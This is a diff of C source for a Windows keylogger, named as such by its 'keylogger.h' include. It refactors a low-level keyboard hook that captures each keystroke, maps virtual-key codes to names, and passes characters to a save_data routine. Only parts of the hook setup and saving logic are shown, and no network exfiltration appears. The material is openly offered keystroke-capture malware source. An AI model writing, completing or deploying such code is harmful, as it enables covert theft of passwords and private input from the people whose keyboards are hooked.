@@ -1,52 +1,7 @@
 #include "keylogger.h"
 
-HINSTANCE hinst;
+static HINSTANCE hinst;
 static HHOOK handlekeyboard = NULL;
-
-struct keyboard keyboard[] =
-{
-	{VK_BACK, "[bck]"},
-	{VK_TAB, "[tab]"},
-	{VK_CLEAR, "[CLR]"},
-	{VK_RETURN, "[enter]"},
-	{VK_SHIFT, "[shift]"},
-	{VK_CONTROL, "[ctrl]"},
-	{VK_MENU, "[alt]"},
-	{VK_CAPITAL, "[Caps Lock]"},
-	{VK_ESCAPE, "[esc]"},
-	{VK_SPACE, "[SPACE]"},
-	{VK_PRIOR, "[PGUP]"},
-	{VK_NEXT, "[PGDW]"},
-	{VK_END, "[END]"},
-	{VK_LEFT, "[LEFT]"},
-	{VK_UP, "[UP]"},
-	{VK_RIGHT, "[RIGHT]"},
-	{VK_DOWN, "[DOWN]"},
-	{VK_SNAPSHOT, "[PRTSCRN]"},
-	{VK_INSERT, "[insert]"},
-	{VK_DELETE, "[DEL]"},
-	{0x30, "0"},
-	{0x31, "1"},
-	{0x32, "2"},
-	{0x33, "3"},
-	{0x34, "4"},
-	{0x35, "5"},
-	{0x36, "6"},
-	{0x37, "7"},
-	{0x38, "8"},
-	{0x39, "9"},
-	{VK_NUMPAD0, "0" },
-	{VK_NUMPAD1, "1" },
-	{VK_NUMPAD2, "2" },
-	{VK_NUMPAD3, "3" },
-	{VK_NUMPAD4, "4" },
-	{VK_NUMPAD5, "5" },
-	{VK_NUMPAD6, "6" },
-	{VK_NUMPAD7, "7" },
-	{VK_NUMPAD8, "8" },
-	{VK_NUMPAD9, "9" },
-	{0, NULL}
-};
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 {
@@ -57,22 +12,22 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 }
 	
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
-{	
+{
 	LPKBDLLHOOKSTRUCT kb;
 	size_t			  i = 0;
 	kb = (LPKBDLLHOOKSTRUCT)lparam;
 	if (kb->vkCode >= 65 && kb->vkCode <= 90 && wparam == WM_KEYDOWN)
 		printf("%c\n", (char)kb->vkCode);
-#if 1
 	else
 	{
 		for (i = 0; keyboard[i].code != kb->vkCode && keyboard[i].code != 0; i++);
-		printf("%s ", keyboard[i].character);
+		if (wparam == WM_KEYDOWN)
+			printf("%s %u\n", keyboard[i].character, kb->vkCode);
 	}
-#endif // 0
-
 	return (CallNextHookEx(handlekeyboard, nCode, wparam, lparam));
 }
+
+
 
 void	setwinhook()
 {
@@ -91,7 +46,7 @@ void	setwinhook()
 	CloseHandle(process.hThread);
 }
 
-void	save_data(char data)
+void	save_data(const char data)
 {
 	static int nbChar;
 
